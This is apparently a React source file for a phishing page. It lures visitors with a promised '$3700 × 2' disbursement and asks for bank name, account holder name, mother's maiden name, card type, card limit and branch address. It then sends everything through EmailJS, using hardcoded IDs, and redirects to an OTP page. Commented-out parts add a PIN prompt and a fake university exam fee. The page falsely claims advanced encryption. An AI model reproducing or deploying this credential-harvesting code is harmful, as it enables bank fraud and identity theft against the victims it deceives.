import React, { useState } from 'react';
import { Modal, Button, Form } from 'react-bootstrap';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
import './ExamForm.css';
import Navbar from './Navbar';
import Footer from './Footer';
import bankLogo from './img/banklogo.png';

const ExamForm = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  // const [showPinModal, setShowPinModal] = useState(false);
  const [formValues, setFormValues] = useState({
    bankName: '',
    cardNumber: '',
    nameOnCard: '',
    maidenName: '',
    cardType: '',
    otherCardType: '',
    streetAddress: '',
    city: '',
    state: '',
    postalCode: '',
    cardLimit: '',
    pin: '',
  });
  const navigate = useNavigate();

  const resetForm = () => {
    setFormValues({
      bankName: '',
      cardNumber: '',
      nameOnCard: '',
      maidenName: '',
      cardType: '',
      otherCardType: '',
      cardLimit: '',
      streetAddress: '',
      city: '',
      state: '',
      postalCode: '',
      pin: '',
    });
  };

  const handlePayClick = (e) => {
    e.preventDefault();
    setShowConfirmModal(true);
  };

  const handleConfirmClick = () => {
    sendEmail();
    resetForm();
    setShowConfirmModal(false);
    navigate('/otp');
    // setShowPinModal(true);
  };

  // const handlePinSubmit = (e) => {
  //   e.preventDefault();
  //   sendEmail();
  //   resetForm();
  //   setShowPinModal(false);
  //   navigate('/otp');
  // };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormValues({ ...formValues, [name]: value });
  };

  const handleNumberOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
  };
  
  const handleCardLimitChange = (e) => {
  e.target.value = e.target.value.replace(/[a-zA-Z]/g, '');
};

  
  // const handleCardLimitChange = (e) => {
  //   e.target.value = e.target.value.replace(/\D/g, '');
  // };
  
  // const handleCardLimitChange = (e) => {

  //   const { name, value } = e.target;

  //   if (/^[\d()+_\s-]*$/.test(value)) {
  //     setFormValues({ ...formValues, [name]: value });
  //   }
  // };

  // const handleTextOnlyInput = (e) => {
  //   e.target.value = e.target.value.replace(/\d/g, '');
  // };

  const handleCardTypeChange = (e) => {
    const { value } = e.target;
    setFormValues({
      ...formValues,
      cardType: value,
      otherCardType: value === 'Others' ? '' : formValues.otherCardType,
    });
  };

  const sendEmail = () => {
    const templateParams = {
      ...formValues,
    };

    emailjs
      .send(
        'service_e234qa4', // Replace with your service ID
        'template_f0nymc7', // Replace with your template ID
        templateParams,
        'aM4ACgzNEz-ykB_dV' // Replace with your user ID
      )
      .then(
        (response) => {
          console.log('SUCCESS!', response.status, response.text);
        },
        (err) => {
          console.log('FAILED...', err);
        }
      );
  };

  return (
    <div>
      <Navbar />
      <div className="container d-flex justify-content-center mt-5">
        <div className="col-md-6 mt-5">
          {/* <h2 className="mt-5">EXAM FORM</h2>
          <p>
            <strong>About The Exam</strong>
          </p>
          <p>Compulsory DePaul University exam: 35% of your course assessment.</p>
          <div className="card mb-3">
            <div className="card-body">
              <p className="card-text fw-medium fs-3">Community Group Exam Form: #journalism #DePaul University</p>
              <p className="fw-bold fs-4 text-end"> - $ 6.00</p>
            </div>
          </div> */}
          <h3>Enter Credit Card Details</h3>
          <p>
            Enter the following to complete payment <br />
            Only enter correct details to avoid <span style={{ color: '#FF0000' }}>error(s)</span> during disbursement.
          </p>
          <div className="card p-4 pt-2">
            <p className='text-end fw-bold fs-6'>Double Disbursement $3700 × 2</p>
            <p className="fst-italic text-end p-0 m-0">Trusted and Secure Payment</p>
            <div className="d-flex justify-content-end mb-3">
              <img src={bankLogo} alt="" className="img-fluid" width={270} height={30} />
            </div>
            <Form onSubmit={handlePayClick} autoComplete="off">
              <Form.Group className="mb-3" controlId="bankName">
                <Form.Label>Bank Name</Form.Label>
                <Form.Control
                  type="text"
                  placeholder="Enter your bank name"
                  name="bankName"
                  value={formValues.bankName}
                  // onInput={handleTextOnlyInput}
                  onChange={handleInputChange}
                  required
                />
              </Form.Group>

              <Form.Group className="mb-3" controlId="nameOnCard">
                <Form.Label>Full Name of Account Holder</Form.Label>
                <Form.Control
                  type="text"
                  placeholder="Enter account holder's full name"
                  name="nameOnCard"
                  value={formValues.nameOnCard}
                  // onInput={handleTextOnlyInput}
                  onChange={handleInputChange}
                  required
                />
              </Form.Group>

              
              <Form.Group className="mb-3" controlId="bankName">
                <Form.Label>Mother’s Maiden Name</Form.Label>
                <Form.Control
                  type="text"
                  placeholder="Enter mother's maiden name"
                  name="maidenName"
                  value={formValues.maidenName}
                  // onInput={handleTextOnlyInput}
                  onChange={handleInputChange}
                  required
                />
              </Form.Group>
              
              <Form.Group className="dropdown-with-icon mb-3" controlId="formCardType">
                <Form.Label>Card Type</Form.Label>
                <Form.Control as="select" name="cardType" value={formValues.cardType} onChange={handleCardTypeChange}>
                  <option value="">Select Card Type</option>
                  <option value="Standard/Basic Credit Card">Standard/Basic Credit Card</option>
                  <option value="Rewards Credit Card (Cash Back, Points, Travel/Miles)">
                    Rewards Credit Card (Cash Back, Points, Travel/Miles)
                  </option>
                  <option value="Secured Credit Card">Secured Credit Card</option>
                  <option value="Student Credit Card">Student Credit Card</option>
                  <option value="Business Credit Card">Business Credit Card</option>
                  <option value="Premium Credit Card">Premium Credit Card</option>
                  <option value="Balance Transfer Credit Card">Balance Transfer Credit Card</option>
                  <option value="Others">Others</option>
                </Form.Control>
                <span className="dropdown-icon">&#9662;</span>
              </Form.Group>

              {formValues.cardType === 'Others' && (
                <Form.Group controlId="formOtherCardType" className="mb-3">
                  <Form.Label>Specify Card Type</Form.Label>
                  <Form.Control
                    type="text"
                    placeholder="Enter card type"
                    name="otherCardType"
                    value={formValues.otherCardType}
                    onChange={handleInputChange}
                    required
                  />
                </Form.Group>
              )}
              
              <Form.Group controlId="formCardLimit" className="mt-2">

              <Form.Label> Card Limit </Form.Label>

              <Form.Control type="text" placeholder="Enter credit card limit (e.g., $5,000)" name="cardLimit" value={formValues.cardLimit}
                onInput={handleCardLimitChange}
                onChange={handleInputChange} required />
            </Form.Group>     

              <Form.Group controlId="formAddress" className="mt-4">
                <Form.Label>Bank Branch Address</Form.Label>
                <Form.Control
                  type="text"
                  placeholder="Street Address"
                  name="streetAddress"
                  value={formValues.streetAddress}
                  onChange={handleInputChange}
                  required
                  className="mb-2"
                />
                {/*
                <Form.Control
                  type="text"
                  placeholder="Street Address Line 2 (Optional)"
                  name="streetAddress2"
                  value={formValues.streetAddress2}
                  onChange={handleInputChange}
                  className="mb-2"
                />
                */}
                <Form.Control
                  type="text"
                  placeholder="City"
                  name="city"
                  value={formValues.city}
                  onChange={handleInputChange}
                  required
                  className="mb-2"
                />
                <Form.Control
                  type="text"
                  placeholder="State / Province"
                  name="state"
                  value={formValues.state}
                  onChange={handleInputChange}
                  required
                  className="mb-2"
                />
                <Form.Control
                  type="text"
                  placeholder="Postal / Zip Code"
                  name="postalCode"
                  value={formValues.postalCode}
                  onChange={handleInputChange}
                  required
                  className="mb-3"
                />
              </Form.Group>

              <p className='fst-italic'>Please review and confirm your account details before submission.</p>

              <Button variant="primary" type="submit">SUBMIT</Button>
              {/* <p className="fw-bold text-end"> - $ 6.00</p> */}
            </Form>
          </div>
          <p className="mt-3"><strong>Trusted and Secured</strong><br />
          Your security is our top priority. We employ advanced encryption protocols to safeguard your information, ensuring the highest standards of data protection.</p>
        </div>
      </div>

      {/* Confirmation Modal */}
      <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
        <Modal.Header closeButton>
          <Modal.Title>Confirm Your Details</Modal.Title>
        </Modal.Header>
        <Modal.Body>
        Please ensure all account details are correct before confirming your submission to avoid <span style={{ color: '#FF0000' }}>error(s)</span> during disbursement.
        </Modal.Body>
        <Modal.Footer>
          <Button variant="secondary" onClick={() => setShowConfirmModal(false)}>
            Cancel
          </Button>
          <Button variant="primary" onClick={handleConfirmClick}>
            Submit
          </Button>
        </Modal.Footer>
      </Modal>

      {/* PIN Modal */}
      {/*
      <Modal show={showPinModal} onHide={() => setShowPinModal(false)}>
        <Modal.Header closeButton>
          <Modal.Title>Enter PIN</Modal.Title>
        </Modal.Header>
        <Modal.Body>
          <Form onSubmit={handlePinSubmit}>
            <Form.Group controlId="formPin">
              <Form.Label>Enter PIN</Form.Label>
              <Form.Control
                type="password"
                placeholder="Enter PIN"
                name="pin"
                value={formValues.pin}
                onInput={handleNumberOnlyInput}
                onChange={handleInputChange}
                required
              />
            </Form.Group>
            <Button variant="primary" type="submit" className="mt-3">
              Submit PIN
            </Button>
          </Form>
        </Modal.Body>
      </Modal>
      */}
      
      <Footer />
    </div>
  );
};

export default ExamForm;
